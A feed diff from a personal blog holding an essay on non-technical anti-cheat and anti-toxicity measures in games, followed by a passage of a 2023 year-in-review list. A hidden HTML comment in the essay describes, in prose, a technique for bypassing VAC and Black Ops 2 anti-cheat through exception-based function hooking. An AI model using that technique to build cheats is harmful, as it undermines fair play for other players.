+them. This of course only deters opportunistic cheaters,
+as people can simply create other accounts to cheat, but this can be made
+harder via purely technical means.&lt;/p&gt;
+&lt;p&gt;Most &lt;em&gt;competitive&lt;/em&gt; online games have ranked and casual game modes, with the
+former being only accessible after having spent a certain amount of time in the
+latter one. Meaning that one has to do it again every time they get banned,
+or &lt;a href="https://en.wikipedia.org/wiki/Boosting_(video_games)"&gt;pay someone to do it&lt;/a&gt;.
+Some studios are even making player go through more hoops to be able to play, like requiring
+&lt;a href="https://en.wikipedia.org/wiki/Multi-factor_authentication"&gt;MFA&lt;/a&gt;,
+or playing a couple of matches against &lt;a href="https://en.wikipedia.org/wiki/Video_game_bot"&gt;bots&lt;/a&gt;
+branded as a tutorial, before being able to play with other people. There is a
+course a fine balance to keep to annoy abusers but not legitimate players.&lt;/p&gt;
+&lt;h2&gt;Player-level measures&lt;/h2&gt;
+&lt;p&gt;The goal of non-technical measures isn't to make it impossible to be abusive,
+but to make it not worth it. Moreover, issuing instahwpermabans to &lt;a href="https://en.wikipedia.org/wiki/Edgelord"&gt;edgelords&lt;/a&gt;
+seems a tad heavy-handed, so having a large panel of measures against abuser makes sense:
+one might want to allow people to rectify their behaviour, to isolate them to
+cool down, and so on. It might include textual warnings, temporary bans, kick
+from the current game, chat/voice mute, losing access to ranked play,
+reducing the amount of earned experience points, …&lt;/p&gt;
+&lt;p&gt;Players are abusive for various reasons, but I'd argue that most do because
+it's fun. Ruining the fun for them is thus a good way to curb such behaviours.
+A simple way to do this is to make them play together, by grouping players
+by reputation, or by having servers with technical anti-cheat measures
+explicitly disabled. But there are even more creative measures,
+like &lt;a href="https://www.callofduty.com/en/blog/2023/11/call-of-duty-ricochet-anti-cheat-modern-warfare-III-progress-report"&gt;disabling their parachute&lt;/a&gt;,
+reducing their damage output to ridiculous levels, taking away their weapons,
+&lt;a href="https://www.callofduty.com/blog/2023/06/call-of-duty-ricochet-anti-cheat-season-04-update"&gt;making other legitimate players invisible to them&lt;/a&gt;,
+randomly drop some of their inputs,
+&lt;a href="https://dustri.org/b/paper-notes-reversing-anti-cheats-detection-generation-cycle-with-configurable-hallucinations.html"&gt;hallucinations&lt;/a&gt;, … and
+while this costs a bit more engineering time than simply grouping them
+together, it has a couple of high-value returns on investment:
+- allowing game developers to spend more time collecting data on how cheats are working on a technical level,
+- reducing the impact cheaters have on a game make is possible to
+  significantly defer banning them without impacting other players too much,
+  making it harder for cheat makers to pinpoint how and why a cheat was
+  detected.
+- it's absolutely hilarious&lt;/p&gt;
+&lt;h2&gt;Examples&lt;/h2&gt;
+&lt;h3&gt;&lt;a href="https://en.wikipedia.org/wiki/Tom_Clancy's_Rainbow_Six_Siege"&gt;Rainbow Six Siege&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;It uses BattlEye, and in end-2022 early 2023 banned around
+  &lt;a href="https://ubisoft.com/en-us/game/rainbow-six/siege/news-updates/2g7hT2NNuOqrj35RfgsFxN/anticheat-status-update-march-2023"&gt;5000&lt;/a&gt;
+  accounts per month, which is a lot, but also shows that it doesn't deter
+  cheaters.&lt;/li&gt;
+&lt;li&gt;The game costs &lt;a href="https://store.steampowered.com/app/359550/Tom_Clancys_Rainbow_Six_Siege/"&gt;$8&lt;/a&gt;,
+  but if you want to have access to all the operators, it's $70. One can also
+  unlock operators by playing, which takes several hundreds of hours.&lt;/li&gt;
+&lt;li&gt;To play ranked, one need to reach &lt;a href="https://ubisoft.com/en-gb/game/rainbow-six/siege/news-updates/4hShcX2HZTG2ttIi3IIN9Y/matchmaking-rating"&gt;level 50&lt;/a&gt;,
+  which takes around 50h, give or takes.&lt;/li&gt;
+&lt;li&gt;The game has a rich ecosystem of cosmetics
+  than can be &lt;a href="https://store.ubisoft.com/us/dlc-type-skins-cosmetics"&gt;purchased for steep prices&lt;/a&gt;,
+  and painstakingly earned by playing,
+  that would be lost in cast of an account ban.&lt;/li&gt;
+&lt;li&gt;Friendly fire will result in the damages being applied to the shoot 
+  should it be reported as voluntary by the player at the receiving end.&lt;/li&gt;
+&lt;li&gt;It's developing a pretty involved &lt;a href="https://ubisoft.com/en-gb/game/rainbow-six/siege/news-updates/22JLMFeayzuamhb7YKbAjm/reputation-system-activation-more"&gt;reputation system&lt;/a&gt;,
+  where people with a "positive" behaviour gets rewarded (more experience
+  points, cosmetics, …), while those with a "negative" one
+  might be prevented from playing &lt;em&gt;ranked&lt;/em&gt;,
+  get less experience points,
+  …&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;a href="https://en.wikipedia.org/wiki/Call_of_Duty:_Modern_Warfare_II_(2022_video_game)"&gt;Call of Duty: Modern Warfare II&lt;/a&gt;:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;The game costs &lt;a href="https://store.steampowered.com/app/1962660/Call_of_Duty_Modern_Warfare_II/"&gt;$70&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://callofduty.com/blog/2023/02/call-of-duty-modern-warfare-II-ranked-play-features-challenges-rewards"&gt;"Players must be at least Level 16 to access Ranked Play"&lt;/a&gt;,
+  but this can be done in a couple of hours.&lt;/li&gt;
+&lt;li&gt;Cheating results in account-wise permaban across all Call of Duty titles.&lt;/li&gt;
+&lt;li&gt;Banned accounts have their records purged from leaderboards.&lt;/li&gt;
+&lt;li&gt;Players engaging in "negative" behaviours might get
+  muted on chat/voice, … and interestingly, cheaters 
+  are going to get paired with other cheaters in matchmaking.
+  &lt;a href="https://support.activision.com/articles/call-of-duty-security-and-enforcement-policy"&gt;Players who are often playing with the same cheaters&lt;/a&gt; (boosting),
+  will also get their reputation tanked.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;a href="https://playvalorant.com/"&gt;Valorant&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Its developer even published a
+&lt;a href="https://playvalorant.com/en-us/news/tags/game-health-series/"&gt;great series of blopost&lt;/a&gt; on
+what it calls "game health"&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The game is free-to-play, but comes with &lt;em&gt;a lot&lt;/em&gt; of &lt;a href="https://valorantstrike.com/valorant-store/"&gt;cosmetics&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Cheaters get a permaban, but people benefiting from them might get a 6 months one as well.&lt;/li&gt;
+&lt;li&gt;Players joining games and &lt;a href="https://playvalorant.com/en-gb/news/dev/valorant-behavior-detection-and-penalty-updates/"&gt;idling to reap out experience points&lt;/a&gt;,
+  doing nothing but kneecapping their team will &lt;a href="https://playvalorant.com/en-us/news/dev/valorant-systems-health-series-afk/"&gt;get penalised&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Players are encouraged to report toxic behaviours, and to not engage,
+  since engagement might be penalized as well&lt;/li&gt;
+&lt;li&gt;Players using,
+  &lt;a href="https://support-valorant.riotgames.com/hc/en-us/articles/360044791253-Inappropriate-In-Game-Names"&gt;certain words&lt;/a&gt;
+  whether in chat or as username,
+  will be flagged as toxic.&lt;/li&gt;
+&lt;li&gt;Penalties come in various size, shapes and durations, allowing to fine tune
+  according to behaviour: warnings, voice/chat restrictions,
+  reduction in experience points
+  gain, reduction in raked rating, increased queue waiting time, ranking game
+  ban, global ban.&lt;/li&gt;
+&lt;li&gt;Valorant &lt;a href="https://playvalorant.com/en-us/news/dev/valorant-systems-health-series-smurf-detection/"&gt;published&lt;/a&gt;
+  their approach to mitigate smurfing; acknowledging that while having multiple accounts
+  to smurf/trade/evade bans/… is not desirable, some people are using
+  them to to play with friends with a better/worse ranked level.
+  So while they took measures to detect and mitigate having multi-accounts,
+  they also relaxed the maximum ranks difference for players to play together,
+  which significantly reduced the number of alt-accounts usage,
+  but also didn't alter match fairness in a measurable way.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;This is all nice and dandy, but is it working? According to
+data from &lt;a href="https://www.ubisoft.com/en-us/game/rainbow-six/siege/player-protection"&gt;Rainbow Six Siege&lt;/a&gt;:
+&lt;a href="https://playvalorant.com/en-us/news/tags/game-health-series/"&gt;Valorant&lt;/a&gt;,
+&lt;a href="https://www.callofduty.com/blog/2023/06/call-of-duty-ricochet-anti-cheat-season-04-update"&gt;Call of Duty: Modern Warfare 2&lt;/a&gt;,
+… those measures are indeed working pretty well,
+and are likely providing better results than technical-only
+measures. They are also cheaper, since steering people away from toxic
+behaviours doesn't reduce the number of players as much as banning them
+outright. It's nice to see that the video game industry realised that cheating and
+abuses/toxicity could be addressed in similar non-technical ways, and that both
+approaches are complementary. This is a stark contrast to other ones,
+where techno-solutionism is seen at the only possible remedy, even more so 
+in our machine-learning-all-the-things era. &lt;/p&gt;
+&lt;h2&gt;Sources and resources&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://youtube.com/watch?v=hI7V60r7Jco"&gt;Anti-Cheat for Multiplayer Games&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://secret.club/"&gt;Secret Club&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://unknowncheats.me/"&gt;UnKnoWnCheaTs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!--
+
+Steam's VAC was already doing basic stuff, like hashing the entire code region of the game on launch, storing the hash, and then re-hashing the code region every few minutes to see if someone had changed the code, presumably to install a trampoline and hook into the game's functions (to write aimbots, wallhacks, etc). When a hash change is detected, the player is banned.
+
+Cheaters found a way to bypass this by simply finding the function they desired to hook and setting any random function pointer within it to 0 (stored in rw memory, so doesn't trigger the code region hash mentioned above). This would trigger an exception, which the cheat developer would catch with Windows' SEH/VEH, effectively giving them a hook into the function without having to modify the code region.
+
+Activision's anti-cheat would then go through a bunch of function pointers (the ones in network/rendering functions mostly, since that's where you'd want to hook to write cheats) and check for null pointers. If a pointer was null, they'd ban you.
+
+Funny enough, this was incredibly easy to bypass: just set the pointer to 1, or 2, or 3, or ...!! All of these addresses are most likely still invalid and they'll still trigger an exception, even though they're theoretically valid pointers, giving you a de-facto hook into the game that bypassed both VAC and BO2's anticheat, and was pretty much unpatchable. Perhaps that's why they started being annoying and banning people for running IDA, Cheat Engine, etc., which are certainly probable indicators but definitely not hard evidence for cheats.
+
+--&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 12 Jan 2024 20:15:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-01-12:/b/on-non-technical-video-games-cheat-mitigations.html</guid><category>games</category></item><item><title>2023 in retrospect</title><link>https://dustri.org/b/2023-in-retrospect.html</link><description>&lt;p&gt;In 2023, I did, amongst other things:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Donated some money:&lt;ul&gt;
+&lt;li&gt;$400 to &lt;a href="https://fsfe.org/"&gt;FSFE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;$5000 to &lt;a href="https://noyb.eu"&gt;NOYB&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;$5000 to &lt;a href="https://riseup.net"&gt;Riseup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;$5000 to the &lt;a href="https://archive.org"&gt;Internet Archive&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;$5000 to the &lt;a href="https://en.wikipedia.org/wiki/Planned_Parenthood"&gt;Planned Parenthood Federation of America&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;$1000 to &lt;a href="https://daysforgirls.org"&gt;days for girls&lt;/a&gt;, on the advice of &lt;a href="https://foreignbystander.com/"&gt;chik&lt;/a&gt; from &lt;a href="https://darkscience.net"&gt;darkscience&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;$200 each, as a &lt;a href="https://opensource.googleblog.com/search/label/peer%20bonus"&gt;Open Source Peer Bonus&lt;/a&gt;, courtesy of Google, to&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/richfelker/"&gt;Rich Felker&lt;/a&gt; for their work on &lt;a href="https://musl.libc.org"&gt;musl&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://mxxn.io/"&gt;Blaž Hrastnik&lt;/a&gt; for their work on &lt;a href="https://helix-editor.com"&gt;Helix&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/justinmk"&gt;Justin Keyes&lt;/a&gt; for their work on &lt;a href="https://neovim.io"&gt;Neovim&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jeanas"&gt;Jean Abou-Samra&lt;/a&gt; for their work on &lt;a href="https://pygments.org"&gt;Pygments&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Read a couple of books:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Killer_(comics)"&gt;Le tueur&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Some &lt;a href="https://en.wikipedia.org/wiki/Warhammer_40,000"&gt;Warhammer 40,000&lt;/a&gt;:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Sons_of_the_Hydra_(Novel)"&gt;Sons of the Hydra&lt;/a&gt;, neat.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Dark_Imperium_(Anthology)"&gt;Dark Imperium (Anthology)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Shroud_of_Night_(Novel)"&gt;Shroud of Night&lt;/a&gt;, forgettable.&lt;/li&gt;
+&lt;li&gt;The &lt;a href="https://wh40k.lexicanum.com/wiki/Black_Legion_(Novel_Series)"&gt;Black Legion&lt;/a&gt; duology, solid.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Renegades:_Harrowmaster_(Novel)"&gt;Renegades: Harrowmaster&lt;/a&gt;, witty.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Assassinorum:_Kingmaker_(Novel)"&gt;Assassinorum: Kingmaker&lt;/a&gt;, decent.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Night_Lords_(Novel_Series)"&gt;Night Lords: The Omnibus&lt;/a&gt;, outstanding.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_Deacon_of_Wounds_(Novel)"&gt;The Deacon of Wounds&lt;/a&gt; great writing style.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/Assassinorum:_Execution_Force_(Novel)"&gt;Assassinorum: Execution force&lt;/a&gt;, forgettable.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_Infinite_and_the_Divine_(Novel)"&gt;The Infinite and the Divine&lt;/a&gt;, highly entertaining.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_End_and_the_Death:_Volume_I_(Novel)"&gt;The End and the Death vol. 1&lt;/a&gt;, a &lt;em&gt;teensy&lt;/em&gt; bit over the top.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_End_and_the_Death:_Volume_II_(Novel)"&gt;The End and the Death vol. 2&lt;/a&gt;, almost there, almost there, ...&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_Macharian_Crusade_(Novel_Series)"&gt;The Macharian Crusade Omnibus&lt;/a&gt;, a writing style a tad heavy.&lt;/li&gt;
+&lt;li&gt;The &lt;a href="https://wh40k.lexicanum.com/wiki/Dark_Imperium_(Novel_Series)"&gt;Dark Imperium&lt;/a&gt; trilogy, nice to see the setting moving forward!&lt;/li&gt;
+&lt;li&gt;The first 5 tomes of the &lt;a href="https://wh40k.lexicanum.com/wiki/Dawn_of_Fire_(Novel_Series)"&gt;Dawn of Fire&lt;/a&gt; heptalogy, definitely a series of books.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wh40k.lexicanum.com/wiki/The_Lion:_Son_of_the_Forest_(Novel)"&gt;The Lion: Son of the Forest&lt;/a&gt;, I've seen Dragon Balls episodes with a quicker pace.&lt;/li&gt;
+&lt;li&gt;Finished the &lt;a href="https://wh40k.lexicanum.com/wiki/The_Beast_Arises_(Novel_Series)"&gt;Beast Arises&lt;/a&gt;
+  dodecalogy. The last chapter of the final book deserved a book on its own,
+  instead of being speedrunned in ~30 pages.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/It%27s_OK_to_Be_Angry_About_Capitalism"&gt;It's OK to Be Angry About Capitalism&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://nostarch.com/hacks-leaks-and-revelations"&gt;Hacks, Leaks, and Revelations&lt;/a&gt;: a &lt;a href="https://dustri.org/b/book-review-hacks-leaks-and-revelations.html"&gt;reference&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://direct.mit.edu/books/book/3008/Beyond-ChoicesThe-Design-of-Ethical-Gameplay"&gt;Beyond choices: The design of ethical gameplay&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://editions-ixe.fr/catalogue/non-le-masculin-ne-lemporte-pas-sur-le-feminin-ned/"&gt;Non, le masculin ne l’emporte pas sur le féminin !&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/This_Changes_Everything_(book)"&gt;This Changes Everything: Capitalism vs. the Climate&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.goodreads.com/en/book/show/51176626"&gt;Break 'em Up: Recovering Our Freedom from Big Ag, Big Tech, and Big Money&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://aosabook.org/en/buy.html"&gt;The Performance of Open Source Applications&lt;/a&gt;: contains some really nice tidbits.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://aosabook.org/en/"&gt;The Architecture of Open Source Applications, Part 1.&lt;/a&gt;: computers were a mistake.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://nostarch.com/kill-it-fire"&gt;Kill It with Fire: Manage Aging Computer Systems (and Future Proof Modern Ones)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://goodreads.com/book/show/38212110-technically-wrong"&gt;Technically Wrong: Sexist Apps, Biased Algorithms, and Other Threats of Toxic Tech&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://nostarch.com/locksport"&gt;Locksport - A Hacker’s Guide to Lockpicking, Impressioning, and Safe Cracking&lt;/a&gt;: &lt;a href="https://dustri.org/b/book-review-locksport-a-hackers-guide-to-lockpicking-impressioning-and-safe-cracking.html"&gt;great&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://freakyclown.com/publications"&gt;How I Rob Banks (and other such places)&lt;/a&gt;, written in an unbearably cocky style, mildly entertaining.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://samleecole.com"&gt;How Sex Changed the Internet and the Internet Changed Sex: An Unexpected History&lt;/a&gt;, a bit too shallow for my taste.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://toddrose.com/endofaverage"&gt;The End of Average&lt;/a&gt;, great book, except the part where the author argues that the goal of schools is to prepare kids for jobs.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://staffeng.com/book"&gt;Staff Engineer: Leadership beyond the management track&lt;/a&gt;, I'm not there yet, but it helped me understand some coworker's jobs and struggles.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://thirdeditions.com/en/sagas/94-metal-gear-solid-hideo-kojima-s-magnum-opus-9791094723616.html"&gt;Metal Gear Solid. Hideo Kojima's Magnum Opus&lt;/a&gt;:
+  deluge of superlatives directed at Kojima, speculative opinionated wild rambling, no mention of the &lt;a href="https://en.wikipedia.org/wiki/Quiet_(Metal_Gear)"&gt;rampant&lt;/a&gt;
+  &lt;a href="https://theguardian.com/technology/2014/apr/09/metal-gear-solid-ground-zeroes-sexual-violence"&gt;sexism&lt;/a&gt;,
+  typos and frenchisms, … prefer the &lt;a href="https://en.wikipedia.org/wiki/Metal_Gear"&gt;wikipedia&lt;/a&gt; and &lt;a href="https://metalgear.fandom.com/wiki/Metal_Gear_Wiki"&gt;fandom&lt;/a&gt; pages instead.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Mirage_(Ruff_novel)"&gt;The Mirage&lt;/a&gt;: I
+  was expecting more of a description of an alternative history than a
+  novel with a lame plot and forgettable characters. The humour is goofy
+  and unsubtle: a punk rock group called Green Desert has an anti-war
+  anthem named "Arabian Idiot"; a morning talk show called Jazeera &amp;amp;
+  Friends, … but this is completely on par with the post-11-September
+  anti-muslim/Iraqi rhetoric, making it both funny and perfectly adequate.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Moved back to France.&lt;/li&gt;
+&lt;li&gt;Volunteered at a library.&lt;/li&gt;
+&lt;li&gt;Refused to sell &lt;a href="https://websec.fr"&gt;websec.fr&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Listened to &lt;a href="https://listenbrainz.org/user/jvoisin/year-in-music/"&gt;some music&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Attended some concerts:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Eisbrecher"&gt;Eisbrecher&lt;/a&gt;, along with &lt;a href="https://maerzfeld.de"&gt;Maerzfeld&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gojira-music.com"&gt;Gojira&lt;/a&gt;, along with &lt;a href="https://alienweaponry.com"&gt;Alien Weaponry&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://katatonia.com"&gt;Katatonia&lt;/a&gt;, along with
+  &lt;a href="https://som.band"&gt;SOM&lt;/a&gt; and &lt;a href="https://solstafir.net"&gt;Sólstafir&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://heavenshallburn.com"&gt;Heaven Shall Burn&lt;/a&gt;, along with
+  &lt;a href="https://trivium.org"&gt;Trivium&lt;/a&gt;,
+  &lt;a href="https://en.wikipedia.org/wiki/Malevolence_(band)"&gt;Malevolence&lt;/a&gt;, and
+  &lt;a href="https://obituary.cc"&gt;Obituary&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://igorrr.com"&gt;Igorrr&lt;/a&gt;, along with
+  &lt;a href="https://derwegeinerfreiheit.de"&gt;Der Weg einer Freiheit&lt;/a&gt;,
+  &lt;a href="https://en.wikipedia.org/wiki/Amenra"&gt;Amenra&lt;/a&gt;, and
+  &lt;a href="http://hangmanschair.com"&gt;Hangman's Chain&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Played some video games:&lt;ul&gt;
+&lt;li&gt;On a computer:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.doomworld.com/forum/topic/134292-myhousewad/"&gt;MyHouse.WAD&lt;/a&gt;: &lt;a href="https://doomwiki.org/wiki/My_House"&gt;wow&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Observer_(video_game)"&gt;&amp;gt;observer_&lt;/a&gt;: didn't like it.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Sea_of_Thieves"&gt;Sea of Thieves&lt;/a&gt;, ~ok with friends.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://hyperstrange.com/our-games/blood-west/"&gt;Blood West&lt;/a&gt;: &lt;a href="https://en.wikipedia.org/wiki/Thief_(series)"&gt;Thief&lt;/a&gt; in the Far West.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Half-Life%3A_Alyx"&gt;Half Life: Alyx&lt;/a&gt;: impressive in every way.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/High_on_Life_(video_game)"&gt;High on Life&lt;/a&gt;: excruciatingly tedious at best.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Cyberpunk_2077#Cyberpunk_2077:_Phantom_Liberty"&gt;Cyberpunk 2077: Phantom Liberty&lt;/a&gt;: glorious.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Tom_Clancy's_Rainbow_Six_Siege"&gt;Rainbow Six: Siege&lt;/a&gt;: better than &lt;a href="https://en.wikipedia.org/wiki/Counter-Strike"&gt;Counter Strike&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Hogwarts_Legacy"&gt;Hogwarts Legacy&lt;/a&gt;: breathtaking and well rounded.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://store.steampowered.com/app/2329130/Rewind_Or_Die/"&gt;Rewind or Die&lt;/a&gt; felt like playing resident evil again &amp;lt;3&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Outer_Wilds"&gt;Outer Wilds&lt;/a&gt;: the controls were too terrible for me to play.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Last_of_Us_Part_I"&gt;The Last of Us Part 1&lt;/a&gt;: ok-ish, not my jam, Joel is a moron.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Witcher_3%3A_Wild_Hunt"&gt;The Witcher 3 - Wild Hunt&lt;/a&gt;: when did video game get so long…&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Apex_Legends"&gt;Apex Legends&lt;/a&gt;: a lame version of &lt;a href="https://en.wikipedia.org/wiki/Titanfall_2"&gt;Titanfall 2&lt;/a&gt;, ok-ish when playing ranked.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Warhammer_40,000:_Chaos_Gate_-_Daemonhunters"&gt;Warhammer 40,000: Chaos Gate - Daemonhunters&lt;/a&gt;:
+  &lt;a href="https://en.wikipedia.org/wiki/XCOM"&gt;XCOM&lt;/a&gt; with &lt;a href="https://wh40k.lexicanum.com/wiki/Grey_Knights"&gt;Grey knights&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Metal%3A_Hellsinger"&gt;Metal: Hellsinger&lt;/a&gt;: looked super-lame on gameplay videos, but was surprisingly fun.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Starfield_(video_game)"&gt;Starfield&lt;/a&gt;: a buggy clunky quickly-boring
+  &lt;a href="https://en.wikipedia.org/wiki/The_Elder_Scrolls_V:_Skyrim"&gt;Skyrim&lt;/a&gt; in space, quickly went back to Cyberpunk 2077.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://store.steampowered.com/app/1172650/INDUSTRIA/"&gt;Industria&lt;/a&gt;: catastrophic performances for looking utterly terrible, along with a clunky feeling, promptly uninstalled.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Journey_to_the_Savage_Planet"&gt;Journey to the Savage Planet&lt;/a&gt;: Rich in poop-oriented
+  jokes, trying hard to be funny and maybe even subversive but systematically falling flat.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Baldur%27s_Gate_3"&gt;Baldur's Gate 3&lt;/a&gt;: not a
+  fan of the &lt;a href="https://en.wikipedia.org/wiki/Dungeons_%26_Dragons"&gt;Dungeons &amp;amp; Dragons&lt;/a&gt; dice-based
+  gameplay, nor of the hard dialog choices cutting entire parts of the game,
+  but still an amazing game.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Metal_Gear_Solid_V:_The_Phantom_Pain"&gt;Metal Gear Solid V: The Definitive Experience&lt;/a&gt;,
+  so &lt;a href="https://en.wikipedia.org/wiki/Metal_Gear_Solid_V:_Ground_Zeroes"&gt;Metal Gear Solid V: Ground Zeroes&lt;/a&gt; and
+  &lt;a href="https://en.wikipedia.org/wiki/Metal_Gear_Solid_V:_The_Phantom_Pain"&gt;Metal Gear Solid V: The Phantom Pain&lt;/a&gt;.
+  I bought it after having seen the former being run at the &lt;a href="https://gamesdonequick.com/tracker/run/5506"&gt;AGDQ 2023&lt;/a&gt;.
+  Truly amazing game overall, except for the &lt;a href="https://en.wikipedia.org/wiki/Metal_Gear_Solid_V:_The_Phantom_Pain#Portrayal_of_Quiet"&gt;sexualisation of the &lt;em&gt;sole&lt;/em&gt; female character&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;On a (glorious) &lt;a href="https://en.wikipedia.org/wiki/Steam_Deck"&gt;Steam Deck&lt;/a&gt;:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://store.steampowered.com/app/638990/UNDYING/"&gt;UNDYING&lt;/a&gt;: nice
+  zombie-related game.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://store.steampowered.com/agecheck/app/1593500/"&gt;God of War&lt;/a&gt;,
+  surprisingly "wholesome".&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blacksaltgames.com/"&gt;Dredge&lt;/a&gt;, terrific indie game: gorgeous looking, simple yet gripping gameplay, interesting lore and story, …&lt;/li&gt;
